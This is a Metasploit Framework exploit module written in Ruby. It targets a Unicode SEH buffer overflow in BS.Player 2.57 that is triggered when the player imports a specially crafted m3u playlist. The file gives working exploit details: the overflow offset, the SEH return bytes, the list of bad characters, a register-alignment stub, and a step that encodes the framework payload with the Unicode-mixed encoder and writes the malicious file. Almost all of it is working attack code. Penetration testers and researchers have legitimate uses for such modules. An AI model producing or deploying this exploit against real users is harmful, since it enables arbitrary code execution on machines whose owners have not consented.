# $Id: $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;BS.Player 2.57 Buffer Overflow Exploit (Unicode SEH)&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits a buffer overflow in BS.Player 2.57. When
                    the playlist import is used to import a specially crafted m3u file,
                    a buffer overflow occurs allowing arbitrary code execution.
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        =>
                [
                    &#039;C4SS!0 G0M3S &#039;, # Original Exploit
                    &#039;Chris Gabriel&#039;, # MSF Module
                    #Greets: Corelan team for mona.py & awesome tutorials
                ],
            &#039;References&#039;    =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/15934/&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;process&#039;,
                    #&#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039;  => &#039;win&#039;,
            &#039;Payload&#039;   =>
                {
                    &#039;Space&#039; => 2000,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x1a\x80",
                    &#039;DisableNops&#039; => true,
                    &#039;StackAdjustment&#039; => -3500,
                },
 
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows XP&#039;,
                        {
                            &#039;Ret&#039;       =>   "\x2f\x49",
                            &#039;Offset&#039;    =>   4102
                        }
                    ], # pop ecx # pop ebp # ret 0c | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READWRITE} [bsplayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.5.7.1051 (bsplayer.exe)
                     
                    [ &#039;Windows 7&#039;,
                        {
                            &#039;Ret&#039;       =>   "\x2f\x49",
                            &#039;Offset&#039;    =>   4102
                        }
                    ], # pop ecx # pop ebp # ret 0c | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READWRITE} [bsplayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.5.7.1051 (bsplayer.exe)
                ],
            &#039;Privileged&#039;    => false,
            &#039;DisclosureDate&#039;    => &#039;Jan 07 2010&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options([OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.m3u&#039;]),], self.class)
 
    end
 
    def exploit
 
        nseh = "\x61\x42"
 
        align   = "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX  
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x50"                # PUSH EAX
        align  += "\x6d"                # PAD
        align  += "\xc3"                # RET
 
        if target == targets[0] then
            padding = rand_text_alpha_lower(1879)
        elsif target == targets[1] then
            padding = rand_text_alpha_lower(1931)
        end
 
        enc = framework.encoders.create(&#039;x86/unicode_mixed&#039;)
 
        register_to_align_to = "EAX"
 
        enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => register_to_align_to })
 
        unicodepayload = enc.encode(payload.encoded, nil, nil, platform)
         
        buffer  = "http://"
        buffer << rand_text_alpha_lower(target[&#039;Offset&#039;])
        buffer << nseh
        buffer << target[&#039;Ret&#039;]
        buffer << align
        buffer << padding
        buffer << unicodepayload
 
        file_create(buffer)
 
    end
end



